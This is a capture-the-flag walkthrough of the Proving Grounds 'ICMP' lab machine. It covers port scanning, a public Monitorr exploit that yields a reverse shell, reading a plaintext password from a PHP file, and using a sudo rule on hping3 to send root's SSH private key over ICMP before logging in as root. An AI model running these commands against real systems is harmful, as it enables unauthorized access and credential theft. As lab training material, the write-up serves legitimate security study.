---
layout: default
title: ICMP
parent: Proving Grounds Play
nav_order: 20
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.226.218
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 22:50 EST
Nmap scan report for 192.168.226.218
Host is up (0.059s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 de:b5:23:89:bb:9f:d4:1a:b5:04:53:d0:b7:5c:b0:3f (RSA)
|   256 16:09:14:ea:b9:fa:17:e9:45:39:5e:3b:b4:fd:11:0a (ECDSA)
|_  256 9f:66:5e:71:b9:12:5d:ed:70:5a:4f:5a:8d:0d:65:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-title:             Monitorr            | Monitorr
|_Requested resource was http://192.168.226.218/mon/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.16 seconds

```

# Enumeration

---

## 80 | HTTP

The system appears to be running Monitorr version 1.7.6

![monitorr](../../../assets/images/ctfs/proving_grounds/icmp/monitorr.png)

# Exploitation

---

There is an exploit for this version of Monitorr

![searchsploit](../../../assets/images/ctfs/proving_grounds/icmp/searchsploit.png)

Run the exploit and we get a reverse shell on our netcat listener.

![shell](../../../assets/images/ctfs/proving_grounds/icmp/shell.png)

# Post-Exploitation

---

## Enumerate Users

We find user _fox_.

Looking in _/home/fox_ we find a directory _/devel_ that we cannot access and a file _reminder_ that we can read.

```bash
www-data@icmp:/home/fox$ cat reminder
crypt with crypt.php: done, it works
work on decrypt with crypt.php: howto?!?

```

There is a hint with a file name _crypt.php_.

If we try to access _/devel/crypt.php_ we can read the contents of the file.

```bash
www-data@icmp:/home/fox$ cat ./devel/crypt.php
<?php
echo crypt('BUHNIJMONIBUVCYTTYVGBUHJNI','da');
?>

```

It looks like we have the unencrypted vesion of the password for _fox_.

If we use that value as a password we can switch to the user _fox_

```bash
www-data@icmp:/home/fox$ su fox
Password:
$ id
uid=1000(fox) gid=1000(fox) groups=1000(fox)

```

## Check Sudo Permissions for User Fox

```bash
$ sudo -l
[sudo] password for fox:
Matching Defaults entries for fox on icmp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fox may run the following commands on icmp:
    (root) /usr/sbin/hping3 --icmp *
    (root) /usr/bin/killall hping3

```

We can use sudo permissions on _hping3_

Checking GTFOBins for _hping3_ exploits.

![gtfobins](../../../assets/images/ctfs/proving_grounds/icmp/gtfobins.png)

We should be able to use this exploit to send the _root_ user _.ssh/id_rsa_ private key to our attack machine.

```bash
# open a second ssh session as user fox
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ ssh fox@192.168.226.218
$ whoami
fox

# Now listen for hping3 traffic locally on loopback 127.0.0.1

$ sudo hping3 --icmp 127.0.0.1 --listen signature --safe
Warning: Unable to guess the output interface
hping3 listen mode
[main] memlockall(): Success
Warning: can't disable memory paging!

# Finally we send the /root/.ssh/id_rsa private key

$ sudo /usr/sbin/hping3 --icmp 127.0.0.1 -d 100 --sign signature --file /root/.ssh/id_rsa
HPING 127.0.0.1 (lo 127.0.0.1): icmp mode set, 28 headers + 100 data bytes
[main] memlockall(): Success
Warning: can't disable memory paging!
len=128 ip=127.0.0.1 ttl=64 id=9781 icmp_seq=0 rtt=2.6 ms


```

As we can see the file is printed line by line in our second SSH session.

![hping](../../../assets/images/ctfs/proving_grounds/icmp/hping.png)

We now have the private rsa key for the root user and can simply SSH as root

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/icmp]
└─$ ssh -i id_rsa root@192.168.226.218
Linux icmp 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 23 20:18:10 2022
root@icmp:~# id
uid=0(root) gid=0(root) groups=0(root)

```
